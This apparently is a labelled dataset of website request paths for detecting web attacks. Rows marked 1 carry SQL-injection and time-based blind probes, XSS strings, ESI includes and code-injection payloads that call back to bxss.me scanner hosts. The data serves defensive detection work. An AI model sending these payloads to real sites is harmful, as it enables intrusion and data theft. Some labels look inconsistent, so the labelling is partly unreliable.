request	label
/***/0/02/03/71/2037113_795566.jpg	0
/**********/system/2020/05/22/013167595.shtml	0
/***/0/01/85/25/1852573_585808.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u82b1\u738b\u7f8e\u5bb9\u7f8e\u4f53\u517b\u751f\u9986	0
/****/zfwjn/1088/1110//xfs.bxss.me.html	1
/**********/system/2021/09/20/013454268.shtml	0
/*****/20211027/10635.html	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5d07\u5c97\u53cc\u7389\u7164\u8d28\u5316\u9a8c\u5ba4	0
/****/0822/729515.shtml	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6d77\u519b\u7535\u5668\u7535\u5b50\u9500\u552e\u4e2d\u5fc3	0
/***/0/01/91/92/1919258_800697.jpg	0
/******/system/2021/11/27/javascript:window.print()	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6768\u5175\u8d27\u7269\u8fd0\u8f93\u90e8	0
/****/zdlygk/bzxajgc' and 2*3*8=6*8 and 'vcdo'='vcdo.htm	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u6587\u5316\u7efc\u5408\u5546\u5e97	0
/****/followuser	0
/**//854/4pynswd0/xhr_send?t=1632363741299	1
/*****/image/i.jpg	0
/****/bmkx/stjj/202003/t20200306_148826.html	0
/****/web/search?perpage=20&outlinepage=10&keyword=1&channelid=240998&searchword=1)); waitfor delay '0:0:2&page=10	1
/****/20201215/e112354295.html	0
/0'xor(if(now()=sysdate(),sleep(3),0))xor'z/**********/video/index_2.html	1
"/' 'a'.concat(70-3).concat(22*4).concat(98).concat(87).concat(116).concat(77) (require'socket'
socket.gethostbyname('hitsc' 'ygmajgihb359b.bxss.me.')[3].to_s) '/****/swsj/"	1
/******/index_19.js	0
/****/b-e355763.html	0
/******/n42821/n42825'||'/n1588869/c1589259/content.html	1
/**********/system/2021/12/15/013494564.shtml	0
/images'||'/**/jquery.js	1
"/*****/system/2021/01/21'""/><iframe src=javascript:alert(1164) /013323672.shtml"	1
/******/rj/1.shtml	0
/*******/vmem.html	0
/****/xxgkml/zfczyjs/bmyjs/201705/w020170519418564130120.xls	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u0134\ufffd	0
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u5174\u5e86\u7164\u77ff\u4e8c\u53f7\u4e95	0
/**********/2020-0'xor(if(now()=sysdate(),sleep(9),0))xor'z-31.html	1
/****/mtgz/mt17_6390/201805/\u83ef\u6f64\u6c34\u6ce5_files/ltgsz.com?n=11	0
"/************/template/jcse/110105008056111/16/' 'a'.concat(70-3).concat(22*4).concat(108).concat(72).concat(118).concat(75) (require'socket'
socket.gethostbyname('hitsz' 'qyciikxt4cc60.bxss.me.')[3].to_s) '/css.js"	1
/****/shzr/202012/t20201207_264516.html	0
/****/czgk/bmyjs/zzqjcyxt/gysrmjcy/201702/t20170207_318490.html	0
/****/20201227/e113192841.html	0
/****/bmkx/sfgw/202004/t20200402_150015.html	0
/***/0/02/08/78/2087821_979297.jpg	0
/***/0/01/30/03/1300353_779587.jpg	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u591a\u76ca\u60e0\u5546\u884c	0
"/************/template/jcse/' 'a'.concat(70-3).concat(22*4).concat(107).concat(76).concat(121).concat(87) (require'socket'
socket.gethostbyname('hitlr' 'pxiumdohde978.bxss.me.')[3].to_s) '/16/images/plugin/criteria/criteria.js"	1
/****/stylenopower.aspx?file=css/stylelogin alert(1740)	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u767e\u5473\u9999\u8c03\u5473\u54c1\u5546\u884c	0
/***/0/10/18/65/10186555_872258.jpg	0
/******/457/jquery.superslide.bxss.me.1.js	1
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u4e07\u624d\u7efc\u5408\u5546\u5e97	0
/******/kjkld/css/1.css	0
/**********/system/2021/12/16/013495331.shtml	0
/************/bxss.me/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js	1
/****/xxgkml/qtfdxx/ssjygk/sjccjg/201912/t20191202_145023.html	0
/****/czgk/bmyjs/zzqjcyxt/sqcdqrmjcy	0
"/"""" """"a"""".concat(70-3).concat(22*4).concat(97).concat(86).concat(112).concat(69) (require""""socket""""
socket.gethostbyname(""""hitqd"""" """"fhkjesmibf974.bxss.me."""")[3].to_s) """"/****/swsj/"	1
/****/zxjx/ and 1=1	1
/****/rdjy/'.gethostbyname(lc('hitpr'.'wetkkxww64d21.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(109).chr(78).chr(100).chr(68).'/t20201225_2539623.html	1
/****/zzxxgk/bmfgj/bmlcj/xxgkml/sfmlxx/list.html	0
/****/zzxxgk/bmsthjj/xxgkml/hjxx/hjwfbgt/202106/t20210618_183910.html	0
/*******/3auoqo.php	1
/****/zzxxgk/jjhzj/zsxm/qjsc/202101/t20210108_175952.html	0
/**********/system/2020/11/26/013291554.shtml	0
/**********/system/2021/05/29/013393515.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u5b89\u7965\u9601\u7f8a\u8089\u9986	0
/****/20201006/e107955218.html	0
/***********/shangpinqihuo/yousejinshu/javascript:void(0)	1
/*********/treasury/index.aspx?nodeid=394%' and 6963=3423 and '%'='	1
/******/qhkc/img4/7.png	0
/**********/system/2016/09/14/012129970.shtml	0
/*******/qiye/b-e528339.html	0
/*******/zwgk/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqxxhjsb/	0
/if(now()=sysdate(),sleep(15),0)/********/jcse/110105008056111/16/images/common.js	1
/wp-content/*******/login-wall-ajpqk/login_wall.php?login=cmd	1
/zwxx_11337/****/202009/t20200909_2227486.html	0
/******/20201104.jpg	0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/zzqgxs/201708/t20170817_549504.html	0
/zwxx_11337/****/202001/t20200123_1931890.html	0
/****/mavideo/gvideos.php?gid=1 and 1=2	1
/****/bmkx/jyj/201908/t20190816_141205.html	0
/***/interface/url_total_pv.json.jsp?callback=jquery19105175192113287723_1640016402099	0
/******/usercenter/index?qrcode=45666	0
/***/my-bug-assignedto.html	0
/****/jtdt/2020_jtyw/202002/t20200201_242231.html	0
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/201910/t20191021_162797.html	0
/******/pic04.png	0
/****/qzfwj/201801/t20180115_669638.html	0
/****/jiushuikongyun/580.html	0
/zwxx_11337/****/201905/t20190529_1526531.html	0
/**/frontcontroller?domainname=<script>alert(77729</script>&operation=160	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u7ecf\u6d4e\u5f00\u53d1\u533a\u8fdb\u4ed3\u9676\u74f7\u7ecf\u9500\u90e8	0
/zwxx_11337/****/zcjd/202109/t20210924_3046790.html	0
"/****/cometchat/plugins/handwrite/index.php?id="""">alert(777)"	1
"/****/system/2021/04/22'""""/><img src=javascript:alert(2440) /013373702.shtml"	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u4e03\u5f69\u661f\u5e8a\u4e0a\u7528\u54c1\u5e97	0
/***/menu/stapp	1
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtpvm5rtalrae/rwd9no8to0=&openid=ovl7jjjqpj7dbvsudkvsrmged8lm&outer_str=scanqrcode&activate_ticket=fdzv9emqaffrnr3xboqhb/jtdw1u0cmlqndtba86uwtoo8dbj5 fzedtzplsmcaris3hq0csxvvk6sl kk23yj3m9sta 5qjyvvxqrvwrhg=	0
"/*/210514-1'""""()&%<acx><script >t2nb(9773)</script>/index/06c5a0c81119dca7da22fc4fd96413d2.js"	1
/**********/system/2017/03/01/012252853.shtml?url_type=39&object_type=webpage&pos=1	1
/******/system/2016/10/13/javascript:void(0);	1
"/****/index.cfm?field="""">alert(777)"	1
/****/system/2021/08/22/javascript:dozoom(9)	1
/***********/zaojianpinglun/?_=1640035811865	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u666e\u6cd5\u76f4\u64ad	0
"/****/zfwjn/1088/1110/list<esi:include src=""""http://bxss.me/rpb.png""""/>.html"	1
/****//765/s9c31aue/xhr_send?t=1633737184873	1
/****/web/search?channelid=299868&perpage=1000%') or 3653=3914 and '%'='	1
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u7b11\u7b11\u8d85\u5e02	0
/****/20211209/10874.html	0
/***/blockdata/getsearchinfo.do?&title=\u590f\u5929\u7684	0
/****/0715/645383.shtml	0
"/***/col209/index.html"""" and """"x""""=""""y"	1
/****/zdlygk/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/wzs/zcwj.htm	1
/**********/system/2020/06/29/013194365.shtml	0
/*******/qiye/b-e404296.html	0
/****/web/search?channelid=222832&searchword=\u7ea2\u5bfa\u5821\u533a\u5072\u8302\u529e\u516c\u7528\u54c1\u5e97	0
/*******/80yj7.php	1
/******/nxrq_priv_icon6cur_4.png	0
"/************/categorysearch.do?cateid=1&eq=1<esi:include src=""""http://bxss.me/rpb.png""""/>&oq=1&p=1&pg=15&pos=1&pq=1&q=«Î ‰»Îπÿº¸¥ &ranksign=1&searchid=1&total=1&tpl=16&websiteid=110105008056111"	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u5229\u60e0\u5546\u573a\u5bb6\u548c\u56ed\u5e97	0
/**********/system/2020/06/27/013193550.shtml	0
/******/system/2014/10/24/011537182_03.shtml	0
/**********/system/2016/01/14/011912993.shtml	0
/**********/system/2021/08/24/013439125.shtml	0
/****/2020wzqh/wzqh_jtdt/202011/t20201130_259604.html' and 'x'='y	1
/***/admin/upgrade_unattended.php?db_type=<script>alert(777)</script>	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u91d1\u51e4\u533a\u4e2a\u4f53\u7ecf\u8425\u7235\u58eb\u70e4\u5427	0
/****/zdlygk/if(now()=sysdate(),sleep(12),0)/gys.htm	1
/****/xxgkml/zfczyjs/list.html?new='.gethostbyname(lc('hitah'.'tjgiagxce1a0a.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(112).chr(67).chr(114).chr(67).'	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u8fdc\u9547\u6d8c\u6cf0\u8db3\u6d74\u5e97	0
"/***/fiyo/?app=article&view=item31ab2"""">alert(777)0ccba&id=186"	1
/**********/system/2021/09/26/ data:image/svg xml,<svg viewbox=	1
/****/bmkx/slyj/201901/t20190131_114252.html	0
"/****/abantecart/index.php?rt=product/manufacturer&manufacturer_id=15""><script>alert(777);</script>"	1
/****/zsrc/goods.list.html?key=23 or 1=1	1
/*****/system/2008/01/17/002338680.shtml	0
"/****/zxjx/"" and ""x""=""y"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u946b\u9633\u5149\u6e05\u6d01\u670d\u52a1\u6709\u9650\u516c\u53f8	0
/*****/gy42/cpgyss.asp?key=\u94a3\u91d1\u52a0\u5de5\u914d\u4ef6\u89c4\u683c\u6807\u51c6&l2=\ufffd\ufffd\u05ef&l=\u027d\ufffd\ufffd	0
/*******/201905311623393.png	0
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u91d1\u79c0\u798f\u7ed2\u6bdb\u9500\u552e\u90e8	0
/zwxx_11337/****/201909/t20190905_1723765.html	0
/***/003/004/205/00300420581_d8d450cc.png	0
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u6d77\u65b0\u6751\u5c45\u59d4\u4f1a	0
/****/20201210/e112025688.html	0
/****/20200704/e103106290.html	0
"/images<esi:include src=""""http://*******/rpb.png""""/>/grayscale.js"	1
/***/xm/menu/images/m0.gif	0
/**********/system/2021/01/04/013313811.shtml	0
"/col"""" and 2*3*8=6*8 and """"uwwe""""=""""uwwe/*****/index.html"	1
/****/zzxxgk/wsjkwyh/gzdt_3599/tzgg_3600/201605/t20160509_162538.html	0
"/******/zsn/index.html/<img src=""javascript:alert(335)"">"	1
"/****/xxgkml/zdmsxx/list.html?new=0.30645946703217297<esi:include src=""""http://bxss.me/rpb.png""""/>"	1
/zwxx_11337/****/202012/t20201230_2543860.html	0
/****/hvwfah-article-e116834020.html	0
/*****/admin/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u542f\u627f\u5bb6\u7535\u7ecf\u9500\u90e8	0
/****/p/bxss.me/t/xss.html?	1
/investors-garden%' and 2*3*8=6*8 and '1082'!='1082%/**********/video/	1
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u5e73\u6607\u7efc\u5408\u5546\u5e97	0
"/**/ui/lib/easyui/plugins'""""()&%<acx><script >sgmr(9490)</script>/jquery.parser.js"	1
/****/qyzdsx/index_1.html	0
/*****/20200810/8472.html	0
/******/public/2019/10/24/93763.images/v93763_b1571901767950_app.jpg	0
/****/zdlygk/ncwywfgz/zws/znx/xmb_gzdxb' and 2*3*8=6*8 and 'oyjz'='oyjz.htm	1
/****/lkw/yw_1292/202112/t20211215_3224087.html	0
/****/20200717/e103657779.html	0
/****/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319	1
/***/viewspace-898.html	0
/investors-garden/**********/video/index%' and 2*3*8=6*8 and 'wb4q'!='wb4q%_2.html	1
/*******/d48g1.php	1
/****/202002/t20200227_243421.html	0
/***/ebs_sub1.cgi	1
/***/viewspace-22.html	0
/****/1wegge-article-e112275099.html	0
/****/0209/322688.shtml	0
"/jsearchfront'""""()&%<acx><script >ke7r(9457)</script>/********/jcse/110105008056111/16/images/result.css"	1
/**********/system/2021/02/02/013330995.shtml	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u946b\u6cfd\u65c5\u6e38\u80a1\u4efd\u6709\u9650\u516c\u53f8	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u767e\u679c\u5343\u7c92\u5e72\u679c\u5546\u884c	0
/************/interfaces/dimension.do?cateid=1&eq=&oq=&p=1&pg=15&pos=&pq=&q=«Î ‰»Îπÿº¸¥ &ranksign=if(now()=sysdate(),sleep(15),0)&searchid=1&total=&tpl=16&websiteid=110105008056111	1
"/***/2021/8/18/art_46_237432.html/""><script>alert(6758)</script>"	1
/zwxx_11337/****/202004/t20200413_2019569.html	0
/************/search.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&pos=filenumber&q=«Î ‰»Îπÿº¸¥ &searchid=44&tpl=16&websiteid=110105008056111	1
"/****/xwdt.htm/""""><script>alert`34605`</script>"	1
/***/jt/jzxy/images/11.jpg	0
/*****/20211020/javascript:void(0);	1
/****/\ufffd\u04f5\ufffd\ufffd\ufffd	0
/****/czgk/bmyjs/zzqjcyxt/hlxrmjcy/201802/t20180223_692994.html	0
/**********/system/2021/12/21/013497414.shtml	0
/***/viewspace-244.html	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u824b\u823a\u9152\u6c34\u5e97	0
/**********/system/2021/06/09/013399135.shtml	0
/****/20210401/9636.html	0
/****/xqdt/hnx/201907/t20190705_139361.html	0
/****/xxgknb/2015/bmnb2015/201603/t20160328_75892.html	0
/****/zzxxgk/jjhzj/gyjzq/jtx_3666/201603/w020200513797824033309.jpg	0
/****/czgk/bmjs/rmtt/tw/201609/t20160922_318538.html	0
"/******/resource/storage/localupload.jsp/""""><script>alert`52229`</script>?doaction=save&rid=1rnott09fg&uptoken=1ff87566684b40c688f756b86e2c3798"	1
/zwgk%' and 2*3*8=6*8 and '6dvr'!='6dvr%/******/ncwywfgz/zws/hyx/xmb_gzdxb.htm	1
/****/css/bank-userinforauthenticationtwo.css	0
/****/zt/msss/msxw/201410/t20141008_325110.html	0
/**********/system/2020/05/26/013171029.shtml	0
/****/if(now()=sysdate(),sleep(12),0)/zcwj/1.htm	1
/*********/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=yuedu°Ëtpage=1	0
/******/system/2020/09/24/013253009.shtml	0
/****/czgk/bmyjs/gmzdp/zzqmj_1426/202002/t20200210_1948279.html	0
/******/system/2019/06/18/012906143.shtml	0
/******/?q=jkjkkjk&scope=extractvalue(1,concat(char(126),md5(1011923114)))&x=13&y=18	1
/*****/system/2021/02/10/javascript:void(0);	1
/****/index.html?channelid=222832&searchword=\u6cd5\u6cbb\u653f\u5e9c	0
/****/20210117/e114584626.html	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\u052d\ufffd\ufffd&l=\ufffd\u3f6d	0
/******/system/2021/04/06/013364201.shtml	0
/************/template/jcse/110105008056111/16/http://bxss.me/t/fit.txt?.jpg/jquery.waterfall.js	1
/*******/countdoc?siteid=115&docid=1378280	0
/****/system/2016/09/25/012142121.shtml	0
/***/0/02/00/18/2001823_987046.png	0
"/****/photostore/workbox.php?mode=addtolightbox&mediaid=""""><script>alert(777)</script>"	1
"/****/zfwjn/1088/1099/list.html?new="""" """"a"""".concat(70-3).concat(22*4).concat(107).concat(79).concat(116).concat(68) (require""""socket""""
socket.gethostbyname(""""hitbh"""" """"gurmidqqb6ee0.bxss.me."""")[3].to_s) """""	1
/****/\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u04bd\u04a9\ufffd\ufffd	0
/****/system/2021/06/21/013405831.shtml	0
/******/zz_tsld_mb.png	0
/****/20201013/e108220151.html	0
/**********/system/2020/07/05/013199050.shtml	0
/**/api/sources?resource=alert(/777/)&format=txt	1
/****/\ufffd\ufffd\ufffd\ufffd\u05a7\ufffd\u05bc\u01bb\ufffd	0
/***/003/004/508/00300450814_230b59d8.png	0
/*****/gg/index.shtml	0
/****************/notification?access_token=79c6409d-da8c-4da7-a8bc-571514016665&id=undefined	0
/****/bmkx/sfgw/202012/w020201225558971795949.jpg	0
/****/czgk/bmjs/rmtt/aglyzhaggclhhy/	0
/****/qzfwj/201801/t20180115_669484.html	0
/***/?	1
"/****/byszx/201611/t20161121_76520.html?leader="""" """"a"""".concat(70-3).concat(22*4).concat(103).concat(84).concat(121).concat(73) (require""""socket""""
socket.gethostbyname(""""hitic"""" """"eqjnjqgxa2ca4.bxss.me."""")[3].to_s) """""	1
/**********/system/2021/09/30/013459416.shtml	0
"/**/cgi-bin/module/sharedobjmanager/policy_new/874/policytable?vdom=""'/></script><script>alert(777)</script>"	1
"/***/col195/index.html"""" and """"x""""=""""x"	1
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u5b81\u4e1c\u610f\u6d0b\u677f\u6750\u7ecf\u9500\u90e8	0
/*****/system/2021/11/30/013488203.shtml	0
/****/gccb/wjwszzgc/	0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqwhhlyt/202103/t20210309_2620297.html	0
/***************/cpsms/20210506/9785.html	0
/wp-content/******/profitmag2.1.8/404.php	1
/****/bmkx/styj/index_23.html	0
/*/210719/index/resource/resource/	1
/****/bmkx/shwj/index_wap_6.html	0
/****/bmkx/sgaj/201912/w020191204622419816192.jpg	0
/******/wap_common.css	0
"/xxgk'""""()&%<acx><script >esev(9004)</script>/******/"	1
/**/system/2021/04/30/012157221.shtml	0
/**********/jxqh/index.shtml	0
/******/qhty/qzty/zgty/	0
/**/ui/widgets/hanweb/http://bxss.me/t/xss.html?	1
/****/qtgz/202101/t20210114_269304.html	0
/**/system/2021/08/03/012188419.shtml	0
/****/zgsdt/zgs17_6389/201712/t20171228_181286.html	0
/****/zzxxgk/tjj/zfxxgkml_2127/jytabljg_2061/list.html?new='.gethostbyname(lc('hitnv'.'qraqkqkq1f414.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(113).chr(73).chr(108).chr(84).'	1
/*******/ui/lib/easyui/plugins/jquery.linkbutton.js	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u6d69\u6ee2\u5e06\u5546\u884c	0
/*******/qiye/b-e1640501.html	0
"/****/zfwjn/1088/1105/"""".gethostbyname(lc(""""hityr"""".""""plkdltfy99c1b.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(102).chr(88).chr(105).chr(79)."""".html"	1
/***/0/02/07/30/2073098_274244.jpg	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u987a\u9053\u7269\u6d41\u6709\u9650\u516c\u53f8	0
/**********/system/more/223010000000000/0002/javascript:void();	1
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u5e02\u65b0\u6d41\u661f\u96e8\u6570\u7801\u55b7\u7ed8\u90e8	0
/****/bmkx/sjcy/201805/t20180509_103259.html	0
/****/wdszs/hfsz/202107/t20210701_184180.html	0
/****/zt/yqfkzccs/yqfkdt/index_74.html	0
/**/system/2021/10/22/012210040.shtml	1
"/***/col35/"""" """"a"""".concat(70-3).concat(22*4).concat(110).concat(78).concat(100).concat(75) (require""""socket""""
socket.gethostbyname(""""hitxi"""" """"deoedrkp50db2.bxss.me."""")[3].to_s) """".html"	1
/****************/notification?access_token=b431c95f-1ba9-497c-8168-ccef62ed12d4&id=undefined	0
/******/dblm/wzdt/	0
/****/0905/794927.shtml	0
/******/resource/interview/room.jsp?wbinterviewid=1033%' or 8448=5317 and '%'='&owner=1707212448	1
/****/system/2021/12/11/javascript:window.print()	1
/****/web/search?channelid=222832&searchword=\u60e0\u519c\u533a\u857e\u742a\u5316\u5986\u54c1\u5546\u884c	0
/****/bygk/shsy/202007/w020200109406089756799.jpg	0
"/****/zzxxgk/tjj/zfxxgkml_2127/xwfbh_2065/list.html?new="""".gethostbyname(lc(""""hitnw"""".""""ufkarjms7b465.bxss.me."""")).""""a"""".chr(67).chr(hex(""""58"""")).chr(122).chr(68).chr(106).chr(85)."""""	1
/****/zdlygk/bzxajgc/ycs%' and 2*3*8=6*8 and 'zixg'!='zixg%/hlx.htm	1
/**/system/2021/02/05/javascript:void(0);	1
/******/system/2014/09/07/011502010.shtml	0
/**********/system/2021/09/06/013446872.shtml	0
/***/resource/css/font-awesome.min.css	0
/*****/003/004/505/00300450571_vw00000000000001_1f330efc.mp4	0
"/******/jzx2.swf/<img src=""javascript:alert(519)"">"	1
/**********/system/2021/08/25/013440047.shtml	0
"/***/col16/index.html"""" and """"x""""=""""y"	1
"/***/getsubject?data={""subject_id"":461,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":126052,""sign"":""""}"	0
/****/zzxxgk/gxs/zfxxgkzn_2129/list.html	0
/*******/qiye/spot-e44912.html	0
/****/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/rsrm.htm	1
/*******/cfk5jc.php	1
/****/20211123/10777.html	0
/**********/system/2021/07/29/013427759.shtml	0
/****/gsry/2013_506/ and 1=1	1
/****/zgsdt/2020_qydt/' and 'x'='y	1
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u4e94\u4ea4\u5316\u516c\u53f8\u94f6\u5ddd\u7ecf\u8425\u7ad9	0
/**********/system/2018/03/27/012575175.shtml	0
/****/20190222/6263.html	0
/************/template/jcse/110105008056111/16/http://bxss.me/t/fit.txt/view.js	1
/*******/qiye/businesses-e42579_4.html?category_id=251687	0
/****/bysw/202001/t20200119_146666.html?leader=∆Ó›·÷–' and 2*3*8=6*8 and 'cx0d'='cx0d	1
/*****/system/2021/12/01/javascript:window.close();	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u751f\u864e\u517b\u6b96\u6709\u9650\u516c\u53f8	0
/****/czgk/bmyjs/rmtt/ql/201702/t20170208_318440.html	0
/***/0/02/12/17/2121771_550382.jpg	0
/****/zdlygk/bzxajgc' and 2*3*8=6*8 and 'kl66'='kl66/gys/jyx.htm	1
"/******/qhqy/index.shtml/""><script>alert(208)</script>"	1
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zzqblj/202002/t20200210_1948698.html	0
/***/0/00/83/94/839473_172190.pdf	1
/***/blockdata/getsearchinfo.do?&title=\u6c38\u5b9a\u533a\u836f\u54c1	0
